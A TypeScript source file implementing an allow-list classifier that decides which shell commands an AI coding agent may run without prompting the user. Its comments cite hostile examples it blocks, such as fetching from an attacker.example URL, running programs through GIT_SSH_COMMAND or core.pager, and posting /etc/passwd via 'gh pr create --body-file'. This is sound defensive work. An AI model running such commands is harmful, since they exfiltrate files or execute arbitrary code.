import { resolve, sep } from 'node:path'
import { parse as parseShell } from 'shell-quote'
import {
  autoApprovalLevelAllows,
  AUTO_APPROVAL_RANK,
  type AutoApprovalLevel,
  type AutoApprovalTier,
} from '@shared/auto-approval.ts'
import { analyzeShellCommand, dangerousInSandboxReasons } from './shell-scope.ts'
import { SAFE_PREP_COMMANDS, splitSegments } from './command-routing.ts'
import { isReadOnlySimpleCommand, READ_ONLY_GIT_SUBCOMMANDS } from './permission-policy.ts'
import { commandName, shellRedirects, TRUST_TRANSPARENT_WRAPPERS } from './shell-argv.ts'

/**
 * Deterministic auto-approval classifier — decide whether a shell command the
 * permission gate would otherwise PROMPT for is a well-known, bounded-risk shape
 * that can run without interrupting the user.
 *
 * SAFETY MODEL. This is a prompt-reduction lever layered on the existing gate,
 * not a new boundary, and it is deliberately an ALLOW-LIST OF SHAPES rather than
 * a denylist of dangers:
 *
 *  - It is **purely deterministic**. No model verdict reaches it. The safety
 *    classifier in `safety-classifier.ts` keeps its existing role — a strict-mode
 *    signal that can only *block* — so the invariant in `docs/threat-model.md`
 *    ("the optional local classifier can only make strict-mode blocks, never
 *    authorize host execution") still holds.
 *  - It **fails closed**. Every segment of the command line must match a
 *    recognised shape; one unrecognised segment, flag, or argument makes the
 *    whole line prompt exactly as it does today. Nothing that prompts today
 *    starts auto-running unless it matches a shape enumerated below.
 *  - It **cannot widen a verdict**. It runs only after the normal policy has
 *    already resolved to `prompt`, and only ever converts that prompt into an
 *    auto-approval. A `deny` is never reachable from here, and a command the
 *    policy already allows never enters this path.
 *  - Its grants are **bounded and recoverable**: reads, local git operations
 *    whose effects survive in the reflog, and additive writes to a remote the
 *    user already configured in the repository. Arbitrary code execution is not
 *    a shape — interpreters, project scripts (`npm test`), ephemeral runners
 *    (`npx`), installs, and any command with substitution or an unrecognised
 *    binary all fall through to the prompt.
 *
 * WHAT IT DOES NOT PROTECT AGAINST. Two shapes here can execute code the
 * repository supplies, and callers must understand that:
 *
 *  - **Git hooks.** `git commit`, `git checkout`, and `git push` run
 *    `.git/hooks/*`. Those are not checked into a repository (so a fresh clone
 *    ships none), but a `core.hooksPath` pointed at a tracked directory, or a
 *    hook the agent itself wrote earlier in the session, is repo-controlled code
 *    that these tiers would execute without a prompt. This is why `local-write`
 *    is a tier of its own, and why neither write tier is the default.
 *  - **Remote content.** `git fetch` writes objects and refs into `.git`. It runs
 *    nothing itself, but it stages content a later checkout could execute.
 *
 * Both are contained by the macOS project sandbox where it is active. Off macOS
 * there is no containment, which the Settings copy says plainly.
 *
 * The classifier is PURE; the settings-backed wrapper (level, workspace trust,
 * auto-run gating, remote lookup) lives in `auto-approval-config.ts`.
 */

export type AutoApprovalDecision =
  | { action: 'auto-approve'; tier: AutoApprovalTier; reasons: string[] }
  | { action: 'prompt'; reasons: string[] }

export interface AutoApprovalContext {
  workspaceRoot: string | null
  /** Highest tier the user has enabled. `off` short-circuits the whole path. */
  level: AutoApprovalLevel
  /**
   * Remote NAMES configured in the workspace repository (`origin`, `upstream`, …).
   *
   * Requiring a configured *name* — never a URL — is the property that makes the
   * network tiers safe: `git fetch origin` reads from a remote the user chose,
   * while `git fetch https://attacker.example/repo` and
   * `git push https://attacker.example/repo` name no configured remote and always
   * prompt. An empty set disables every network shape.
   */
  configuredRemotes: ReadonlySet<string>
  /**
   * Resolve symlinks when possible, so a prep step cannot leave the workspace via
   * a link that resolves cleanly under the root lexically. Falls back to the
   * lexical result when absent or throwing (e.g. the path does not exist yet).
   * Same injected-resolver shape as {@link ShellHarmContext}.
   */
  canonicalizePath?: (path: string) => string
}

// ---------------------------------------------------------------------------
// Lexical pre-checks
// ---------------------------------------------------------------------------

/**
 * Quote-aware scan for command substitution, subshell grouping, backticks, and
 * parameter expansion — any of which can hide an arbitrary tool from segment
 * analysis.
 *
 * Quote awareness matters here in a way it does not for the trusted-command
 * router (which is deliberately over-broad): the most common `local-write` shape
 * is `git commit -m "fix the parser (#123)"`, and an over-broad scan would refuse
 * every commit message containing a parenthesis or a `$`. So the scan tracks
 * quoting and flags only what the shell would actually act on:
 *
 *  - unquoted `` ` ``, `$`, `(`, `)` — substitution or grouping;
 *  - `` ` `` and `$` inside double quotes — the shell still expands there;
 *  - nothing inside single quotes, where the shell expands nothing.
 *
 * A backslash escape consumes the next character, so `\$HOME` is literal.
 *
 * Redirections are NOT scanned here — {@link shellRedirects} is the codebase's
 * answer for those and already understands that `2>&1` duplicates a descriptor
 * rather than opening a file.
 */
function hasSubstitution(command: string): boolean {
  let quote: '"' | "'" | null = null

  for (let i = 0; i < command.length; i++) {
    const ch = command.charAt(i)

    if (ch === '\\' && quote !== "'") {
      i++ // escaped character is literal
      continue
    }
    if (quote === "'") {
      if (ch === "'") quote = null
      continue
    }
    if (quote === '"') {
      if (ch === '"') quote = null
      else if (ch === '`' || ch === '$') return true
      continue
    }
    if (ch === '"' || ch === "'") {
      quote = ch
      continue
    }
    if (ch === '`' || ch === '$' || ch === '(' || ch === ')') return true
  }

  return false
}

/**
 * The only redirect target this classifier accepts: writing to the bit bucket
 * discards output rather than persisting it anywhere.
 */
const DISCARD_TARGET = '/dev/null'

/**
 * Whether the command opens a file for writing anywhere other than `/dev/null`.
 *
 * Delegates to {@link shellRedirects}, which the harm gate already relies on: it
 * parses rather than pattern-matches, and it deliberately excludes `>&`
 * descriptor duplication because that "writes no file" — which is exactly the
 * `2>&1` carve-out this classifier needs, since that suffix appears on most real
 * command lines.
 */
function writesAFile(command: string): boolean {
  return shellRedirects(command).some((redirect) => redirect.target !== DISCARD_TARGET)
}

/**
 * Strip the redirect syntax that {@link writesAFile} has already cleared, so the
 * remainder tokenizes as plain words. Purely a tokenization aid, NOT a security
 * check: `shell-quote` yields operator objects for `>` and `&`, which would make
 * {@link argvOf} refuse `git fetch origin main 2>&1`.
 */
function stripClearedRedirects(segment: string): string {
  return segment
    .replace(/(?:^|\s)&?\d?>{1,2}\s*\/dev\/null\b/g, ' ')
    .replace(/(?:^|\s)\d?>\s*&\s*\d/g, ' ')
    .trim()
}

/**
 * Tokenize a segment into plain words. Returns null when the segment contains a
 * glob, an operator, or anything `shell-quote` does not resolve to a literal
 * string — an argument we cannot read is an argument we will not approve.
 */
function argvOf(segment: string): string[] | null {
  let tokens: ReturnType<typeof parseShell>
  try {
    tokens = parseShell(segment)
  } catch {
    return null
  }
  if (tokens.length === 0) return null
  if (!tokens.every((token): token is string => typeof token === 'string')) return null
  return tokens
}

/**
 * Drop leading `VAR=value` assignments and pass-through wrappers (`env`,
 * `command`, …) so `env git status` classifies as `git status`. Uses the routing
 * wrapper set — the narrow one that answers "which binary did the user ask for",
 * not the harm gate's wider one that sees through `sudo`. A `sudo` prefix is
 * therefore an unrecognised head here and prompts, which is the intent.
 */
function effectiveArgv(argv: readonly string[]): string[] | null {
  let index = 0
  while (index < argv.length) {
    const token = argv[index] ?? ''
    // A leading `VAR=value` assignment is REFUSED, not skipped. The environment
    // is an execution channel for exactly the commands this classifier accepts:
    // `GIT_SSH_COMMAND='curl …' git fetch origin` and `GIT_EXTERNAL_DIFF=… git
    // diff` both make git run an arbitrary program, and the argv still reads as a
    // plain `git fetch` / `git diff`. None of the accepted shapes needs a
    // per-command environment override, so the whole segment prompts instead.
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(token)) return null
    if (TRUST_TRANSPARENT_WRAPPERS.has(commandName(token))) {
      index++
      continue
    }
    break
  }
  return argv.slice(index)
}

function isFlag(token: string): boolean {
  return token.startsWith('-') && token !== '-'
}

/** The flag name without its `=value` tail, so `--depth=1` matches `--depth`. */
function flagName(token: string): string {
  const eq = token.indexOf('=')
  return eq === -1 ? token : token.slice(0, eq)
}

/**
 * A plain ref / refspec token: branch names, tags, `HEAD~1`, `a..b`, `src:dst`.
 * Anything with a URL scheme, a `~` home reference, a leading `/`, `+`, or `:`
 * (force and delete refspecs), or a parent-directory escape is not plain and
 * makes the segment prompt. This is what stops `git fetch https://attacker/x`,
 * `git push origin +main`, and `git push origin :main` reaching a network tier.
 */
const PLAIN_REF_TOKEN = /^[A-Za-z0-9._][A-Za-z0-9._/^~@{}-]*(?::[A-Za-z0-9._][A-Za-z0-9._/^~-]*)?$/

function isPlainRefToken(token: string): boolean {
  if (token.includes('://')) return false
  if (token.startsWith('../') || token.includes('/../')) return false
  return PLAIN_REF_TOKEN.test(token)
}

/**
 * A workspace-relative pathspec: no absolute path, no home reference, no
 * parent-directory escape. Used for `git add`, whose positional arguments are
 * paths rather than refs.
 */
function isWorkspaceRelativePath(token: string): boolean {
  if (token.startsWith('/') || token.startsWith('~')) return false
  if (token.startsWith('../') || token.includes('/../') || token === '..') return false
  return true
}

/**
 * Whether a prep command's argument stays inside the workspace.
 *
 * `analyzeShellCommand` catches most escapes (`cd /etc`, `ls ~/.ssh`), but a
 * bare `~` carries no path separator for its outside-path scanner to key on, so
 * `cd ~ && ls` scored `sandbox` and would have auto-approved a listing of the
 * user's home directory. Prep commands get this explicit containment check on
 * top rather than a patch to the shared heuristic, which other callers rely on.
 *
 * An argument-less `cd` (which goes home) and `cd -` (the previous directory,
 * unknowable here) are both refused.
 */
function prepArgumentsStayInWorkspace(
  head: string,
  args: readonly string[],
  context: AutoApprovalContext,
): boolean {
  const positional = args.filter((token) => !isFlag(token))
  if (head === 'cd') {
    // `cd` alone changes to the home directory.
    if (positional.length !== 1) return false
    if (positional[0] === '-') return false
  }
  const { workspaceRoot } = context
  if (!workspaceRoot) {
    // With no workspace to compare against, only clearly-relative paths pass.
    return positional.every(isWorkspaceRelativePath)
  }
  // Canonicalize both sides so `cd link-to-etc` cannot leave the workspace by a
  // symlink that resolves cleanly under the root lexically. Same approach (and
  // same injected resolver) as the harm analyzer's path handling; when no
  // resolver is supplied, or it throws on a path that does not exist yet, the
  // lexical result stands.
  const canonical = (path: string): string => {
    try {
      return context.canonicalizePath?.(path) ?? path
    } catch {
      return path
    }
  }
  const root = canonical(workspaceRoot)
  return positional.every((token) => {
    if (token.startsWith('~')) return false
    const resolved = canonical(resolve(workspaceRoot, token))
    return resolved === root || resolved.startsWith(root + sep)
  })
}

// ---------------------------------------------------------------------------
// git
// ---------------------------------------------------------------------------

/**
 * The only global options (those before the subcommand) this classifier accepts.
 * Everything else prompts, because the interesting ones relocate the repository
 * or name a program to run: `git -c core.pager='sh -c …' log` and
 * `git -c protocol.ext.allow=always fetch …` both turn a read into arbitrary
 * execution. Refusing by default means a git option we have never heard of
 * cannot slip through.
 */
const GIT_ALLOWED_GLOBAL_OPTIONS: ReadonlySet<string> = new Set([
  '--no-pager',
  '--no-optional-locks',
  '--no-replace-objects',
])

/**
 * Options that name a program for git to run, or relocate where it operates, at
 * ANY position in the argv. Rejected even inside a subcommand whose other flags
 * are allow-listed, so a future addition to a flag table cannot accidentally
 * admit one of these.
 */
const GIT_EXECUTING_OPTIONS: ReadonlySet<string> = new Set([
  '-c',
  '-C',
  '-o',
  '--output',
  '--exec',
  '--exec-path',
  '--upload-plugin',
  '--receive-plugin',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--config-env',
])

/**
 * Subcommands that only read repository state. Built as a SUPERSET of
 * {@link READ_ONLY_GIT_SUBCOMMANDS} — the set `permission-policy.ts` already uses
 * for its structural read-only check — so the two cannot drift into disagreeing
 * about whether, say, `git log` reads. The extras below are ones this classifier
 * needs and that check does not.
 */
const GIT_READ_SUBCOMMANDS: ReadonlySet<string> = new Set([
  ...READ_ONLY_GIT_SUBCOMMANDS,
  'shortlog',
  'describe',
  'blame',
  'rev-list',
  'merge-base',
  'name-rev',
  'check-ignore',
  'count-objects',
  'version',
])

/**
 * Subcommands whose read/write split depends on their arguments, resolved by
 * {@link classifyMixedGitSubcommand} rather than a flat table.
 */
const GIT_MIXED_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'branch',
  'remote',
  'stash',
  'checkout',
  'switch',
  'tag',
])

/** Subcommands that talk to a remote, resolved by {@link classifyNetworkGitSubcommand}. */
const GIT_NETWORK_SUBCOMMANDS: ReadonlySet<string> = new Set(['fetch', 'ls-remote', 'push'])

/** Flags accepted on `git fetch` / `git ls-remote`. Anything else prompts. */
const GIT_FETCH_FLAGS: ReadonlySet<string> = new Set([
  '--all',
  '--prune',
  '-p',
  '--tags',
  '-t',
  '--no-tags',
  '--depth',
  '--deepen',
  '--unshallow',
  '--quiet',
  '-q',
  '--verbose',
  '-v',
  '--progress',
  '--no-progress',
  '--dry-run',
  '--heads',
  '--refs',
])

/**
 * Flags accepted on `git push`. Deliberately absent: `--force`/`-f`,
 * `--force-with-lease`, `--mirror`, `--delete`/`-d`, and `--prune` — each can
 * destroy refs on the remote, the one part of a push not recoverable from the
 * local repository. `shell-harm.ts` already prompts on `git push --force` in
 * Guarded YOLO; standard mode agrees here.
 */
const GIT_PUSH_FLAGS: ReadonlySet<string> = new Set([
  '--set-upstream',
  '-u',
  '--tags',
  '--follow-tags',
  '--quiet',
  '-q',
  '--verbose',
  '-v',
  '--progress',
  '--no-progress',
  '--dry-run',
  '--no-verify',
  '--atomic',
])

/** Flags on `fetch`/`ls-remote`/`push` whose value is a separate argument. */
const GIT_NETWORK_VALUE_FLAGS: ReadonlySet<string> = new Set(['--depth', '--deepen'])

interface LocalWriteSpec {
  flags: ReadonlySet<string>
  /** Flags whose value is the next argument, so it is not read as a positional. */
  valueFlags: ReadonlySet<string>
  /** How positional arguments are validated. */
  positional: 'paths' | 'none'
}

/** Local-write subcommands and the argument shapes accepted on each. */
const GIT_LOCAL_WRITE_SPECS: ReadonlyMap<string, LocalWriteSpec> = new Map([
  [
    'add',
    {
      flags: new Set(['-A', '--all', '-u', '--update', '-f', '--force', '-n', '--dry-run', '-v']),
      valueFlags: new Set(),
      positional: 'paths',
    },
  ],
  [
    'commit',
    {
      flags: new Set([
        '-m',
        '--message',
        '-a',
        '--all',
        '--amend',
        '--no-verify',
        '-n',
        '--allow-empty',
        '--no-edit',
        '-q',
        '--quiet',
        '--signoff',
        '-s',
      ]),
      valueFlags: new Set(['-m', '--message']),
      positional: 'none',
    },
  ],
])

/** A git segment carrying any option that names a program or relocates the repo. */
function hasExecutingGitOption(argv: readonly string[]): boolean {
  return argv.some((token) => isFlag(token) && GIT_EXECUTING_OPTIONS.has(flagName(token)))
}

/**
 * Split a git argv into `{ subcommand, args }`, or null when a global option
 * outside {@link GIT_ALLOWED_GLOBAL_OPTIONS} appears before the subcommand.
 */
function splitGitArgv(argv: readonly string[]): { subcommand: string; args: string[] } | null {
  let index = 1
  while (index < argv.length) {
    const token = argv[index] ?? ''
    if (!isFlag(token)) break
    if (!GIT_ALLOWED_GLOBAL_OPTIONS.has(flagName(token))) return null
    index++
  }
  const subcommand = argv[index]
  if (!subcommand) return null
  return { subcommand, args: argv.slice(index + 1) }
}

/**
 * Partition an argument list into flags and positionals, consuming the value of
 * any flag in `valueFlags` that was not written in `--flag=value` form. Returns
 * null when a flag is not in `allowed`.
 */
function partitionArgs(
  args: readonly string[],
  allowed: ReadonlySet<string>,
  valueFlags: ReadonlySet<string>,
): { positional: string[] } | null {
  const positional: string[] = []
  for (let index = 0; index < args.length; index++) {
    const token = args[index] ?? ''
    if (!isFlag(token)) {
      positional.push(token)
      continue
    }
    const name = flagName(token)
    if (!allowed.has(name)) return null
    if (valueFlags.has(name) && !token.includes('=')) index++
  }
  return { positional }
}

/**
 * Classify a git subcommand whose tier depends on its arguments. Returns the
 * tier, or null to prompt. Every branch is fail-closed: an argument shape that is
 * not explicitly recognised falls through to null.
 */
function classifyMixedGitSubcommand(
  subcommand: string,
  args: readonly string[],
): AutoApprovalTier | null {
  const positional = args.filter((token) => !isFlag(token))
  const flags = args.filter(isFlag).map(flagName)

  switch (subcommand) {
    case 'branch': {
      // `--show-current`, `--list`, `-v`, or a bare `git branch` only read.
      const destructive = [
        '-d',
        '-D',
        '--delete',
        '-m',
        '-M',
        '--move',
        '-c',
        '-C',
        '--copy',
        '-f',
        '--force',
      ]
      if (flags.some((flag) => destructive.includes(flag))) return null
      if (positional.length === 0) return 'read'
      // `git branch <name>` creates a branch — a local write.
      return positional.every(isPlainRefToken) ? 'local-write' : null
    }
    case 'remote': {
      // Only the read forms: bare, `-v`, `get-url <name>`, `show <name>`.
      if (positional.length === 0) return 'read'
      const verb = positional[0] ?? ''
      if (verb !== 'get-url' && verb !== 'show') return null
      return positional.slice(1).every(isPlainRefToken) ? 'read' : null
    }
    case 'stash': {
      const verb = positional[0]
      if (verb === undefined) return 'local-write' // bare `git stash` stashes
      if (verb === 'list' || verb === 'show') return 'read'
      // `clear` and `drop` discard stashes irrecoverably — never auto-approved.
      if (verb === 'push' || verb === 'pop' || verb === 'apply') {
        return positional.slice(1).every(isPlainRefToken) ? 'local-write' : null
      }
      return null
    }
    case 'checkout':
    case 'switch': {
      // Branch selection and creation only. The pathspec forms (`git checkout .`,
      // `git checkout -- src/`) discard uncommitted work, so `--` and `.` are
      // refused, as are the force/reset flags.
      const create = subcommand === 'checkout' ? '-b' : '-c'
      const allowed = new Set([create, '--quiet', '-q', '--track', '-t', '--detach'])
      if (flags.some((flag) => !allowed.has(flag))) return null
      if (args.includes('--')) return null
      if (positional.length !== 1) return null
      const target = positional[0] ?? ''
      if (target === '.') return null
      return isPlainRefToken(target) ? 'local-write' : null
    }
    case 'tag': {
      const destructive = ['-d', '--delete', '-f', '--force']
      if (flags.some((flag) => destructive.includes(flag))) return null
      if (positional.length === 0) return 'read' // `git tag` lists
      return positional.every(isPlainRefToken) ? 'local-write' : null
    }
    default:
      return null
  }
}

/**
 * Classify a network git subcommand (`fetch`, `ls-remote`, `push`). Each one must
 * resolve to a remote the repository already has configured, so a URL target can
 * never be auto-approved:
 *
 *  - a positional argument naming a configured remote (`git push origin main`), or
 *  - no positional arguments at all, in which case git uses the branch's
 *    configured upstream — which is a configured remote by construction, but only
 *    when the repository has at least one.
 */
function classifyNetworkGitSubcommand(
  subcommand: string,
  args: readonly string[],
  configuredRemotes: ReadonlySet<string>,
): { tier: AutoApprovalTier } | { reason: string } {
  const isPush = subcommand === 'push'
  const partitioned = partitionArgs(
    args,
    isPush ? GIT_PUSH_FLAGS : GIT_FETCH_FLAGS,
    GIT_NETWORK_VALUE_FLAGS,
  )
  // Distinguished from the remote check below because these reasons are written
  // to the durable decision log: reporting a rejected `--force-with-lease` as
  // "does not name a configured remote" would send an auditor after the wrong
  // thing entirely.
  if (!partitioned) return { reason: `unrecognised or unsafe flag on git ${subcommand}` }

  const { positional } = partitioned
  if (!positional.every(isPlainRefToken)) {
    return { reason: `git ${subcommand} argument is not a plain ref or remote name` }
  }

  const namesConfiguredRemote = positional.some((token) => configuredRemotes.has(token))
  if (!namesConfiguredRemote) {
    // No remote named: only the implicit-upstream form is acceptable, and only in
    // a repository that actually has remotes configured.
    if (positional.length > 0) {
      return { reason: `git ${subcommand} does not name a configured remote` }
    }
    if (configuredRemotes.size === 0) {
      return { reason: `git ${subcommand} has no configured remote to fall back on` }
    }
  }

  return { tier: isPush ? 'remote-write' : 'read' }
}

// ---------------------------------------------------------------------------
// gh
// ---------------------------------------------------------------------------

/**
 * `gh` subcommand pairs that only read from GitHub. `gh api` is deliberately
 * absent: it can issue any request, including mutations, with no shape this
 * classifier could check.
 */
const GH_READ_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'pr view',
  'pr list',
  'pr diff',
  'pr checks',
  'pr status',
  'issue view',
  'issue list',
  'issue status',
  'run view',
  'run list',
  'repo view',
  'release view',
  'release list',
  'workflow list',
  'workflow view',
  'label list',
  'search prs',
  'search issues',
  'search repos',
  'auth status',
])

/**
 * `gh` subcommand pairs that write to the user's own repository, kept to the
 * additive and reversible ones. Absent on purpose — mirroring `GITHUB_WRITE_TOOLS`
 * in `permission-policy.ts`, which always prompts — are `pr merge`, `pr approve`,
 * `pr ready`, `pr close`, `run rerun`, `workflow run`, `repo delete`, and
 * `release create`: they land code, cast a review, or destroy state.
 */
const GH_WRITE_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'pr create',
  'pr comment',
  'issue create',
  'issue comment',
])

/**
 * Flags accepted on a `gh` write. Deliberately absent are every file-reading
 * flag (`--body-file`/`-F`, `--template`/`-T`) — which would post the contents of
 * an arbitrary local file to github.com — and `--repo`/`-R`, which would retarget
 * the write away from the workspace's own repository.
 */
const GH_WRITE_FLAGS: ReadonlySet<string> = new Set([
  '--title',
  '-t',
  '--body',
  '-b',
  '--base',
  '-B',
  '--head',
  '-H',
  '--draft',
  '-d',
  '--assignee',
  '-a',
  '--label',
  '-l',
  '--milestone',
  '-m',
  '--fill',
  '--no-maintainer-edit',
])

/**
 * Classify a `gh` invocation. Write subcommands additionally refuse `--repo`/`-R`,
 * so the target is always the repository the workspace's own remote points at
 * rather than an arbitrary one named on the command line.
 *
 * Known limitation: `gh` honours user-defined aliases (`gh alias set pr '!…'`),
 * which live in the user's own `~/.config/gh/` — user-controlled configuration,
 * not repository-controlled, and so outside this classifier's threat model.
 */
function classifyGhSegment(argv: readonly string[]): AutoApprovalTier | null {
  const words = argv.slice(1).filter((token) => !isFlag(token))
  const pair = `${words[0] ?? ''} ${words[1] ?? ''}`.trim()
  if (GH_READ_SUBCOMMANDS.has(pair)) return 'read'
  if (!GH_WRITE_SUBCOMMANDS.has(pair)) return null
  // Writes take an explicit flag allow-list rather than a denylist of `--repo`.
  // The flags that matter are the ones that read a local file and post its
  // contents to github.com — `gh pr create --body-file /etc/passwd` is
  // exfiltration wearing the shape of a PR — and `--repo`/`-R`, which would aim
  // the write at a repository other than the workspace's own.
  const flags = argv.filter(isFlag).map(flagName)
  return flags.every((flag) => GH_WRITE_FLAGS.has(flag)) ? 'remote-write' : null
}

// ---------------------------------------------------------------------------
// Segment classification
// ---------------------------------------------------------------------------

interface SegmentVerdict {
  /** Null means "prompt" — the segment matched no recognised shape. */
  tier: AutoApprovalTier | null
  reason: string
}

function classifyGitSegment(
  argv: readonly string[],
  segment: string,
  context: AutoApprovalContext,
): SegmentVerdict {
  if (hasExecutingGitOption(argv)) {
    return { tier: null, reason: `git option names a program or relocates the repo: ${segment}` }
  }
  const split = splitGitArgv(argv)
  if (!split) return { tier: null, reason: `unrecognised git global option: ${segment}` }
  const { subcommand, args } = split

  if (GIT_NETWORK_SUBCOMMANDS.has(subcommand)) {
    const outcome = classifyNetworkGitSubcommand(subcommand, args, context.configuredRemotes)
    return 'tier' in outcome
      ? { tier: outcome.tier, reason: `git ${subcommand} against a configured remote` }
      : { tier: null, reason: `${outcome.reason}: ${segment}` }
  }

  // `git remote` is flagged `external` by the scope heuristic (the pattern covers
  // the config-mutating forms), but the read forms this classifier accepts only
  // print local configuration — so the scope check below does not apply to it.
  if (subcommand !== 'remote') {
    if (analyzeShellCommand(segment, context.workspaceRoot).verdict !== 'sandbox') {
      return { tier: null, reason: `git command reaches outside the workspace: ${segment}` }
    }
  }

  if (GIT_READ_SUBCOMMANDS.has(subcommand)) {
    return { tier: 'read', reason: `git ${subcommand} reads repository state` }
  }
  if (GIT_MIXED_SUBCOMMANDS.has(subcommand)) {
    const tier = classifyMixedGitSubcommand(subcommand, args)
    return tier
      ? { tier, reason: `git ${subcommand} (${tier})` }
      : { tier: null, reason: `git ${subcommand} form not recognised: ${segment}` }
  }
  const spec = GIT_LOCAL_WRITE_SPECS.get(subcommand)
  if (spec) {
    const partitioned = partitionArgs(args, spec.flags, spec.valueFlags)
    if (!partitioned)
      return { tier: null, reason: `unrecognised flag on git ${subcommand}: ${segment}` }
    if (spec.positional === 'none' && partitioned.positional.length > 0) {
      return { tier: null, reason: `unexpected argument to git ${subcommand}: ${segment}` }
    }
    if (spec.positional === 'paths' && !partitioned.positional.every(isWorkspaceRelativePath)) {
      return {
        tier: null,
        reason: `git ${subcommand} names a path outside the workspace: ${segment}`,
      }
    }
    return { tier: 'local-write', reason: `git ${subcommand} writes the local repository` }
  }
  return { tier: null, reason: `git ${subcommand} is not an auto-approved shape` }
}

function classifySegment(segment: string, context: AutoApprovalContext): SegmentVerdict {
  const lexical = stripClearedRedirects(segment)
  const argv = argvOf(lexical)
  if (!argv) return { tier: null, reason: `unparseable segment: ${segment}` }

  const effective = effectiveArgv(argv)
  if (!effective)
    return { tier: null, reason: `environment assignment before the command: ${segment}` }
  const head = commandName(effective[0])
  if (!head) return { tier: null, reason: `no command word in: ${segment}` }

  if (head === 'git') return classifyGitSegment(effective, lexical, context)

  if (head === 'gh') {
    const tier = classifyGhSegment(effective)
    return tier
      ? { tier, reason: `gh ${effective.slice(1, 3).join(' ')} (${tier})` }
      : { tier: null, reason: `gh subcommand not auto-approved: ${segment}` }
  }

  // Every remaining recognised shape is workspace-local and non-mutating, so a
  // segment the scope analyzer flags as reaching outside the workspace is out.
  // Checked per segment and never waived, so `cd ~ && ls` prompts on the `cd`.
  if (analyzeShellCommand(lexical, context.workspaceRoot).verdict !== 'sandbox') {
    return { tier: null, reason: `segment reaches outside the workspace: ${segment}` }
  }
  if (SAFE_PREP_COMMANDS.has(head)) {
    if (!prepArgumentsStayInWorkspace(head, effective.slice(1), context)) {
      return { tier: null, reason: `prep step leaves the workspace: ${segment}` }
    }
    return { tier: 'read', reason: `trivially-safe prep step: ${head}` }
  }
  if (isReadOnlySimpleCommand(lexical)) {
    return { tier: 'read', reason: `read-only command: ${head}` }
  }
  return { tier: null, reason: `not an auto-approved shape: ${head}` }
}

/**
 * Decide whether `command` — which the permission gate has already resolved to a
 * PROMPT — matches a bounded-risk shape that may run without asking.
 *
 * Returns `prompt` for anything unrecognised, so the caller's existing prompt
 * path remains the default in every uncertain case.
 */
export function assessAutoApproval(
  command: string,
  context: AutoApprovalContext,
): AutoApprovalDecision {
  if (context.level === 'off') return { action: 'prompt', reasons: ['auto-approval is off'] }

  const trimmed = command.trim()
  if (!trimmed) return { action: 'prompt', reasons: ['empty command'] }

  if (hasSubstitution(trimmed)) {
    return { action: 'prompt', reasons: ['command substitution or parameter expansion present'] }
  }
  if (writesAFile(trimmed)) {
    return { action: 'prompt', reasons: ['redirection writes to a file'] }
  }
  // The destructive-pattern denylist is applied to the WHOLE line as well as per
  // segment, so a pattern spanning a segment boundary still disqualifies.
  const dangerous = dangerousInSandboxReasons(trimmed)
  if (dangerous.length > 0) return { action: 'prompt', reasons: dangerous }

  const segments = splitSegments(trimmed)
  if (segments.length === 0) return { action: 'prompt', reasons: ['no segments'] }

  const reasons: string[] = []
  let tier: AutoApprovalTier = 'read'
  for (const segment of segments) {
    if (dangerousInSandboxReasons(segment).length > 0) {
      return { action: 'prompt', reasons: [`destructive segment: ${segment}`] }
    }
    const verdict = classifySegment(segment, context)
    if (verdict.tier === null) return { action: 'prompt', reasons: [verdict.reason] }
    if (AUTO_APPROVAL_RANK[verdict.tier] > AUTO_APPROVAL_RANK[tier]) tier = verdict.tier
    reasons.push(verdict.reason)
  }

  if (!autoApprovalLevelAllows(context.level, tier)) {
    return {
      action: 'prompt',
      reasons: [`command is tier "${tier}", above the configured level "${context.level}"`],
    }
  }

  return { action: 'auto-approve', tier, reasons }
}
